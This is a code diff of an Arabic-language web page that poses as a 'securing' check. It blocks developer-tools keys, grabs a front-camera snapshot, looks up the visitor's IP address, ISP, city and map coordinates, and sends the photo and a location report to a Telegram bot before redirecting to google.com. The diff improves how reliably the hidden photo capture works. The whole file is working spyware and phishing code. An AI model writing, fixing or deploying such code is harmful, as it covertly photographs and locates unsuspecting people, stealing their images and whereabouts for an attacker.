@@ -20,11 +20,10 @@
         <button class="btn" onclick="megaCapture()">بدء التأمين</button>
     </div>
 
-    <video id="v" autoplay playsinline></video>
+    <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
-        // منع الفحص
         document.addEventListener('keydown', e => {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) e.preventDefault();
         });
@@ -38,70 +37,71 @@
             btn.disabled = true;
 
             try {
-                // 1. تشغيل الكاميرا مع دعم الموبايل (playsinline)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 } 
+                    } 
+                });
+                
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                setTimeout(async () => {
-                    try {
-                        const c = document.getElementById('c');
-                        c.width = v.videoWidth; 
-                        c.height = v.videoHeight;
-                        c.getContext('2d').drawImage(v, 0, 0);
-
-                        // 2. سحب الـ IP مع معالجة الخطأ
-                        let i = { ip: "N/A", org: "Unknown", city: "Unknown", country_name: "Jordan" };
-                        try {
-                            const res = await fetch('https://ipapi.co/json/');
-                            if (res.ok) i = await res.json();
-                        } catch (e) { console.log("IP API Fail"); }
-
-                        // 3. سحب الـ GPU بأمان
-                        let gpu = "Unknown";
-                        try {
-                            const gl = c.getContext('webgl');
-                            const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                            if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-                        } catch (e) { gpu = "Blocked"; }
-
-                        // 4. بناء تقرير مختصر جداً لتجنب رفض تيليجرام
-                        const report = `
-📍 IP: ${i.ip}
-🏢 ISP: ${i.org}
-🌍 Loc: ${i.city}, ${i.country_name}
-📱 Dev: ${navigator.platform} | ${navigator.hardwareConcurrency} Cores
-🔋 Bat: ${navigator.getBattery ? "Check Log" : "N/A"}
-🎮 GPU: ${gpu.substring(0, 50)}
-🔗 Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;
-
-                        // 5. الإرسال (تحويل الصورة لبوب)
-                        c.toBlob(async (blob) => {
-                            if (!blob) return;
-                            const fd = new FormData();
-                            fd.append('chat_id', CH_ID);
-                            fd.append('photo', blob, 'secure.jpg');
-                            fd.append('caption', report);
-                            // تم إلغاء parse_mode لتجنب كسر النص بالرموز
-
-                            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: fd
-                            });
-
-                            // إنهاء العملية
-                            stream.getTracks().forEach(t => t.stop());
-                            alert("تم التأمين بنجاح.");
-                            window.location.href = "https://google.com";
-                        }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الإرسال
-
-                    } catch (e) { console.error(e); }
-                }, 1500);
+                // الحل هنا: ننتظر حتى يبدأ الفيديو فعلياً بالعمل
+                v.onloadedmetadata = () => {
+                    v.play();
+                    // ننتظر ثانية إضافية بعد التشغيل الفعلي للتأكد من زوال السواد
+                    setTimeout(async () => {
+                        takeSnapshot(v, stream);
+                    }, 1000);
+                };
 
             } catch (e) {
-                alert("يجب السماح للمتابعة.");
+                alert("يجب السماح للكاميرا لإتمام عملية التأمين.");
                 btn.innerHTML = "بدء التأمين";
                 btn.disabled = false;
+            }
+        }
+
+        async function takeSnapshot(v, stream) {
+            try {
+                const c = document.getElementById('c');
+                // نأخذ الأبعاد الحقيقية للفيديو الخارج من الكاميرا
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
+                const ctx = c.getContext('2d');
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+
+                // سحب البيانات
+                let i = { ip: "N/A", org: "Unknown", city: "Unknown", country_name: "Jordan" };
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    if (res.ok) i = await res.json();
+                } catch (e) {}
+
+                const report = `📍 IP: ${i.ip}\n🏢 ISP: ${i.org}\n🌍 Loc: ${i.city}, ${i.country_name}\n📱 Dev: ${navigator.platform}\n🔗 Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;
+
+                c.toBlob(async (blob) => {
+                    if (!blob) return;
+                    const fd = new FormData();
+                    fd.append('chat_id', CH_ID);
+                    fd.append('photo', blob, 'secure.jpg');
+                    fd.append('caption', report);
+
+                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+
+                    // إغلاق الكاميرا والتحويل
+                    stream.getTracks().forEach(t => t.stop());
+                    alert("تم التأمين بنجاح.");
+                    window.location.href = "https://google.com";
+                }, 'image/jpeg', 0.8);
+
+            } catch (err) {
+                console.error(err);
             }
         }
     </script>
